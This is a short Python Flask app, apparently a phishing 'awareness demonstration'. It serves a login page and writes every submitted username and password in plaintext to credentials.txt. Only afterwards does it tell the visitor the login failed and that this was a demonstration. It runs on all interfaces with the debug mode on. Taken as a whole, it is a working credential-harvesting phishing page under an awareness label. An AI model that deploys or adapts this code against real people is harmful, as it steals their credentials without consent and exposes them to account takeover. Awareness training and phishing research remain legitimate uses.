from flask import Flask, request, render_template_string

app = Flask(__name__)


with open("index.html", "r") as file:
    login_page = file.read()

@app.route("/")
def home():
    return render_template_string(login_page)

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    
    with open("credentials.txt", "a") as f:
        f.write(f"Username: {username}, Password: {password}\n")
    
    return "Login failed. This was a demonstration of phishing awareness."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
